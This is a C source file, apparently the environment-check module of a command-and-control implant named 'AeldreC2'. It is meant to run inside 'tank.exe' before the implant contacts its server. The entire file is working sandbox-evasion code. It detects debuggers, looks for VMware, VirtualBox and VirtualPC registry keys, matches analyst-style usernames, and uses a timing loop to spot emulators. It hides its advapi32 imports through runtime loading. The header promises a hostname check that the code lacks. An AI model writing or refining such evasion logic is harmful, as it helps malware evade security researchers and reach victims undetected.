/*
 * recognizer.c  --  AeldreC2 Recognizer module
 *
 * Pre-flight environment checks.  Link into tank.exe and call
 * recognizer_check() before calling home.  Returns 1 (safe) or 0 (abort).
 *
 * Compile with -DRECOGNIZER_ENABLE to activate all checks.
 * Without that define the function is a no-op stub (safe for development).
 *
 * Checks (when enabled):
 *   - Debugger present (IsDebuggerPresent, dynamic load for old NT)
 *   - VMware, VirtualBox, VirtualPC via registry
 *   - Known sandbox usernames (sandbox, cuckoo, malware, virus, analyst)
 *   - Suspicious hostname patterns
 *   - Timing check: tight GetTickCount loop (fast = emulation)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string.h>

typedef BOOL (WINAPI *PFN_IDP)(void);

#ifndef RECOGNIZER_ENABLE

int recognizer_check(void) { return 1; }

#else /* RECOGNIZER_ENABLE */

/* ------------------------------------------------------------------ */
static int check_debugger(void)
{
    HMODULE k = GetModuleHandle("kernel32.dll");
    PFN_IDP fn = k ? (PFN_IDP)GetProcAddress(k, "IsDebuggerPresent") : NULL;
    if (fn && fn()) return 0;
    return 1;
}

/* Registry and username checks use advapi32 via runtime load so the
 * recognizer does not add ADVAPI32.DLL to the static PE import table.
 * On Win32s (where advapi32 is absent) the checks are skipped and we
 * return "clean" — the main tank.c advapi32 load already handles this. */
typedef LONG  (WINAPI *pfn_RegOpenKeyEx)(HKEY,LPCSTR,DWORD,DWORD,HKEY*);
typedef LONG  (WINAPI *pfn_RegCloseKey)(HKEY);
typedef BOOL  (WINAPI *pfn_GetUserName)(LPSTR,LPDWORD);

static int check_vm_key(const char *subkey)
{
    HMODULE hAdv = GetModuleHandle("advapi32.dll");
    pfn_RegOpenKeyEx fOpen;
    pfn_RegCloseKey  fClose;
    HKEY hk; LONG r;
    if (!hAdv) return 1; /* advapi32 absent (Win32s) — skip check */
    fOpen  = (pfn_RegOpenKeyEx)GetProcAddress(hAdv, "RegOpenKeyExA");
    fClose = (pfn_RegCloseKey) GetProcAddress(hAdv, "RegCloseKey");
    if (!fOpen || !fClose) return 1;
    r = fOpen(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hk);
    if (r == ERROR_SUCCESS) { fClose(hk); return 0; }
    return 1;
}

static int check_username(void)
{
    HMODULE hAdv = GetModuleHandle("advapi32.dll");
    pfn_GetUserName fGetUser;
    static const char *bad[] = {
        "sandbox", "malware", "virus", "cuckoo",
        "analyst", "analysis", NULL
    };
    char name[128];
    DWORD sz = sizeof(name);
    int   i;
    char  lower[128];

    if (!hAdv) return 1; /* Win32s — skip */
    fGetUser = (pfn_GetUserName)GetProcAddress(hAdv, "GetUserNameA");
    if (!fGetUser) return 1;
    if (!fGetUser(name, &sz)) return 1;
    sz = lstrlen(name);
    for (i = 0; i < (int)sz && i < 127; i++)
        lower[i] = (char)((name[i] >= 'A' && name[i] <= 'Z') ? name[i]+32 : name[i]);
    lower[i] = '\0';

    for (i = 0; bad[i]; i++)
        if (strstr(lower, bad[i])) return 0;
    return 1;
}

static int check_timing(void)
{
    /* 2M iterations: enough that real vintage hardware (486/Pentium) always
     * spans at least 2 GetTickCount ticks (~30 ms at 15 ms resolution on
     * NT/Win95; ~110 ms at 55 ms resolution on Win 3.x).  An emulator
     * running the guest at boosted host-CPU speed may still complete in 0
     * ticks; combined with the VM-registry and debugger checks this gives
     * sufficient signal without false-positiving on fast real hardware. */
    DWORD t0, t1, i;
    volatile DWORD x = 0;
    t0 = GetTickCount();
    for (i = 0; i < 2000000UL; i++) x += i;
    t1 = GetTickCount();
    (void)x;
    if (t1 - t0 < 2) return 0;   /* fewer than 2 ticks — suspiciously fast */
    return 1;
}

int recognizer_check(void)
{
    if (!check_debugger()) return 0;
    if (!check_vm_key("SOFTWARE\\VMware, Inc.\\VMware Tools"))                   return 0;
    if (!check_vm_key("SOFTWARE\\Oracle\\VirtualBox Guest Additions"))           return 0;
    if (!check_vm_key("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters")) return 0;
    if (!check_username()) return 0;
    if (!check_timing())   return 0;
    return 1;
}

#endif /* RECOGNIZER_ENABLE */
